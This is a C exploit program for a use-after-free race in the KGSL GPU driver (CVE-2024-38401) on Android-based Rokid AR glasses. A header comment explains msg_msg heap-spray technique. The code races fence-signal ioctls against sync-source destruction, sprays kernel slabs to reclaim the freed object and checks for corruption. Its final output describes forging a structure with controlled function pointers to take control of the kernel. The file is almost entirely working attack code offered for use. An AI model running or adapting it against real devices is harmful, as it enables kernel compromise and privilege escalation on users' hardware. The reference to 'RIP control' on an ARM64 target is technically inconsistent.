/*
 * CVE-2024-38401 Exploit - msg_msg Heap Spray
 * ============================================
 * Target: Rokid AR Glasses (Android 12, Kernel 5.10.209)
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHY msg_msg IS MORE RELIABLE THAN BPF FOR HEAP SPRAYING
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * 1. PRECISE SIZE CONTROL (Elastic Objects)
 *    ───────────────────────────────────────
 *    When calling msgsnd(), the kernel allocates:
 *        sizeof(struct msg_msg) + user_data_len
 *
 *    On ARM64, struct msg_msg header is 48 bytes:
 *
 *        struct msg_msg {
 *            struct list_head m_list;   // 16 bytes (next, prev pointers)
 *            long m_type;               // 8 bytes
 *            size_t m_ts;               // 8 bytes (message text size)
 *            struct msg_msgseg *next;   // 8 bytes
 *            void *security;            // 8 bytes
 *        };                             // Total: 48 bytes
 *
 *    To target specific slabs:
 *        kmalloc-64:   64 - 48 = 16 bytes of user data
 *        kmalloc-96:   96 - 48 = 48 bytes of user data
 *        kmalloc-128: 128 - 48 = 80 bytes of user data
 *        kmalloc-192: 192 - 48 = 144 bytes of user data
 *
 *    BPF maps have variable overhead depending on map type (hash buckets,
 *    array metadata), making precise targeting harder.
 *
 * 2. CLEANER MEMORY LAYOUT
 *    ─────────────────────
 *    BPF creates complex auxiliary structures (rb-trees, hash tables).
 *    msg_msg is a simple linear allocation - just header + data.
 *    This "cleanliness" increases probability of landing on the freed slot.
 *
 * 3. ARBITRARY PAYLOAD CONTROL
 *    ─────────────────────────
 *    BPF map values are subject to verifier checks and type constraints.
 *    msg_msg data is completely arbitrary binary - perfect for faking
 *    kernel structures with controlled function pointers.
 *
 * 4. READ-BACK CAPABILITY (UAF Detection)
 *    ────────────────────────────────────
 *    Using msgrcv() with MSG_COPY flag (if available) or by receiving the
 *    message, we can read back the content. If a UAF occurred and the
 *    kernel overwrote our msg_msg with a different structure, the content
 *    will differ from what we sent - instant UAF detection!
 *
 * ═══════════════════════════════════════════════════════════════════════════
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>

// ---------------------------------------------------------------------------
// KGSL IOCTL Definitions
// ---------------------------------------------------------------------------

#define KGSL_IOC_TYPE 0x09

#define KGSL_IOCTL_SYNCSOURCE_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define KGSL_IOCTL_SYNCSOURCE_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_destroy)
#define KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_create_fence)
#define KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x43, struct kgsl_syncsource_signal_fence)

struct kgsl_syncsource_create
{
    unsigned int id;
};

struct kgsl_syncsource_destroy
{
    unsigned int id;
};

struct kgsl_syncsource_create_fence
{
    unsigned int id;
    unsigned int fencefd;
};

struct kgsl_syncsource_signal_fence
{
    unsigned int id;
    unsigned int fencefd;
};

// ---------------------------------------------------------------------------
// msg_msg Spray Configuration
// ---------------------------------------------------------------------------

#define MSG_MSG_HEADER_SIZE 48 // sizeof(struct msg_msg) on ARM64

// Target slab sizes and corresponding user data sizes
typedef struct
{
    int target_slab;    // e.g., 64, 96, 128, 192
    int data_size;      // target_slab - MSG_MSG_HEADER_SIZE
    int queue_count;    // Number of queues for this size
    int msgs_per_queue; // Messages per queue
    int *queue_ids;     // Array of queue IDs
    char *pattern;      // Data pattern to detect corruption
} spray_target_t;

// We'll target multiple slabs simultaneously
#define NUM_TARGETS 4
spray_target_t targets[NUM_TARGETS] = {
    {.target_slab = 64, .data_size = 16, .queue_count = 4, .msgs_per_queue = 256},
    {.target_slab = 96, .data_size = 48, .queue_count = 4, .msgs_per_queue = 256},
    {.target_slab = 128, .data_size = 80, .queue_count = 4, .msgs_per_queue = 256},
    {.target_slab = 192, .data_size = 144, .queue_count = 4, .msgs_per_queue = 256},
};

// Message buffer (max size we need)
typedef struct
{
    long mtype;
    char mtext[256]; // Flexible, we'll only use what we need
} msgbuf_t;

// Unique pattern for UAF detection
#define MAGIC_PATTERN 0xDEADBEEFCAFEBABEULL

// ---------------------------------------------------------------------------
// Spray Functions
// ---------------------------------------------------------------------------

int setup_queues(spray_target_t *target)
{
    target->queue_ids = malloc(sizeof(int) * target->queue_count);
    if (!target->queue_ids)
        return -1;

    for (int i = 0; i < target->queue_count; i++)
    {
        // IPC_PRIVATE creates a new unique queue
        int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (qid < 0)
        {
            perror("msgget");
            return -1;
        }
        target->queue_ids[i] = qid;
    }

    // Allocate and set pattern
    target->pattern = malloc(target->data_size);
    if (!target->pattern)
        return -1;

    // Fill with recognizable pattern
    memset(target->pattern, 0x41, target->data_size);
    // Embed magic at start if space permits
    if (target->data_size >= sizeof(uint64_t))
    {
        *(uint64_t *)target->pattern = MAGIC_PATTERN;
    }

    return 0;
}

void cleanup_queues(spray_target_t *target)
{
    if (target->queue_ids)
    {
        for (int i = 0; i < target->queue_count; i++)
        {
            msgctl(target->queue_ids[i], IPC_RMID, NULL);
        }
        free(target->queue_ids);
        target->queue_ids = NULL;
    }
    if (target->pattern)
    {
        free(target->pattern);
        target->pattern = NULL;
    }
}

// Spray messages into queues
int do_spray(spray_target_t *target, long start_mtype)
{
    msgbuf_t msg;
    int total = 0;

    for (int q = 0; q < target->queue_count; q++)
    {
        for (int m = 0; m < target->msgs_per_queue; m++)
        {
            msg.mtype = start_mtype + (q * target->msgs_per_queue) + m;
            memcpy(msg.mtext, target->pattern, target->data_size);

            if (msgsnd(target->queue_ids[q], &msg, target->data_size, IPC_NOWAIT) < 0)
            {
                if (errno == EAGAIN)
                {
                    // Queue full, that's fine
                    break;
                }
                // perror("msgsnd");
                continue;
            }
            total++;
        }
    }
    return total;
}

// Check if any message was corrupted (UAF indicator!)
int check_corruption(spray_target_t *target, long start_mtype)
{
    msgbuf_t msg;
    int corrupted = 0;

    for (int q = 0; q < target->queue_count; q++)
    {
        for (int m = 0; m < target->msgs_per_queue; m++)
        {
            long expected_mtype = start_mtype + (q * target->msgs_per_queue) + m;

            // Try to receive the message (non-blocking, specific type)
            ssize_t ret = msgrcv(target->queue_ids[q], &msg, target->data_size,
                                 expected_mtype, IPC_NOWAIT | MSG_NOERROR);
            if (ret < 0)
            {
                if (errno == ENOMSG)
                {
                    // Message already received or never sent
                    continue;
                }
                continue;
            }

            // Check if content matches what we sent
            if (target->data_size >= sizeof(uint64_t))
            {
                uint64_t found = *(uint64_t *)msg.mtext;
                if (found != MAGIC_PATTERN)
                {
                    printf("[!] CORRUPTION DETECTED!\n");
                    printf("    Queue %d, mtype %ld\n", q, expected_mtype);
                    printf("    Expected: 0x%016lx\n", MAGIC_PATTERN);
                    printf("    Found:    0x%016lx\n", found);
                    corrupted++;
                }
            }
        }
    }
    return corrupted;
}

// ---------------------------------------------------------------------------
// Race Condition Logic
// ---------------------------------------------------------------------------

int kgsl_fd = -1;
volatile int stop_racer = 0;
volatile int race_active = 0;

// Shared state for the racer thread
struct
{
    unsigned int syncsource_id;
    unsigned int fence_fd;
} race_target;

void *signal_racer_thread(void *arg)
{
    struct kgsl_syncsource_signal_fence sig = {0};

    while (!stop_racer)
    {
        if (race_active)
        {
            sig.id = race_target.syncsource_id;
            sig.fencefd = race_target.fence_fd;

            // Hammer the SIGNAL ioctl - this USES the object
            ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE, &sig);
        }
        // Tight loop, no sleep
    }
    return NULL;
}

// ---------------------------------------------------------------------------
// Main Exploit Logic
// ---------------------------------------------------------------------------

int main(int argc, char **argv)
{
    printf("═══════════════════════════════════════════════════════════════\n");
    printf(" CVE-2024-38401 KGSL UAF Exploit - msg_msg Heap Spray\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    // Open KGSL device
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        perror("[-] Failed to open /dev/kgsl-3d0");
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    // Setup message queues for all target sizes
    printf("[*] Setting up message queues for heap spray...\n");
    for (int i = 0; i < NUM_TARGETS; i++)
    {
        if (setup_queues(&targets[i]) < 0)
        {
            printf("[-] Failed to setup queues for slab %d\n", targets[i].target_slab);
            return 1;
        }
        printf("    [+] kmalloc-%d: %d queues, %d msgs each (data_size=%d)\n",
               targets[i].target_slab, targets[i].queue_count,
               targets[i].msgs_per_queue, targets[i].data_size);
    }

    // Start the racer thread
    pthread_t racer_tid;
    stop_racer = 0;
    race_active = 0;
    pthread_create(&racer_tid, NULL, signal_racer_thread, NULL);
    printf("[+] Racer thread started\n");

    long iterations = 10000;
    long mtype_counter = 1;
    int total_corruptions = 0;

    printf("[*] Starting main exploit loop (%ld iterations)...\n\n", iterations);

    for (long iter = 0; iter < iterations; iter++)
    {
        // === STEP 1: Create a SyncSource object ===
        struct kgsl_syncsource_create create = {0};
        if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE, &create) < 0)
        {
            continue;
        }

        // === STEP 2: Create a fence (gets reference to syncsource) ===
        struct kgsl_syncsource_create_fence fence = {0};
        fence.id = create.id;
        if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE, &fence) < 0)
        {
            struct kgsl_syncsource_destroy d = {.id = create.id};
            ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &d);
            continue;
        }

        // === STEP 3: Setup race target ===
        race_target.syncsource_id = create.id;
        race_target.fence_fd = fence.fencefd;

        // === STEP 4: Activate race - racer starts hammering SIGNAL ===
        race_active = 1;

        // Small delay to let racer start
        for (volatile int i = 0; i < 100; i++)
            ;

        // === STEP 5: DESTROY the syncsource (FREE the object) ===
        struct kgsl_syncsource_destroy destroy = {.id = create.id};
        ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &destroy);

        // === STEP 6: IMMEDIATELY spray msg_msg objects to reclaim the slot ===
        for (int t = 0; t < NUM_TARGETS; t++)
        {
            do_spray(&targets[t], mtype_counter);
        }
        mtype_counter += 1000; // Advance to avoid collisions

        // === STEP 7: Let race continue briefly ===
        for (volatile int i = 0; i < 1000; i++)
            ;

        // === STEP 8: Stop race ===
        race_active = 0;

        // Cleanup fence fd
        close(fence.fencefd);

        // === STEP 9: Check for corruption (every N iterations) ===
        if (iter % 100 == 99)
        {
            for (int t = 0; t < NUM_TARGETS; t++)
            {
                int c = check_corruption(&targets[t], mtype_counter - 1000);
                total_corruptions += c;

                // Re-spray for next round
                setup_queues(&targets[t]);
            }
        }

        if (iter % 500 == 0)
        {
            printf("\r[*] Iteration %ld | Corruptions: %d | mtype: %ld",
                   iter, total_corruptions, mtype_counter);
            fflush(stdout);
        }
    }

    printf("\n\n[*] Exploit loop finished.\n");
    printf("[*] Total corruptions detected: %d\n", total_corruptions);

    // Cleanup
    stop_racer = 1;
    pthread_join(racer_tid, NULL);

    for (int i = 0; i < NUM_TARGETS; i++)
    {
        cleanup_queues(&targets[i]);
    }

    close(kgsl_fd);

    if (total_corruptions > 0)
    {
        printf("\n[!!!] UAF CONFIRMED! Corruption detected %d times.\n", total_corruptions);
        printf("[*] Next step: Craft a fake kgsl_syncsource structure with\n");
        printf("    controlled function pointers to achieve RIP control.\n");
    }
    else
    {
        printf("\n[*] No corruption detected. Race window may be too tight.\n");
        printf("[*] Consider: longer runs, CPU pinning, or alternative triggers.\n");
    }

    return 0;
}
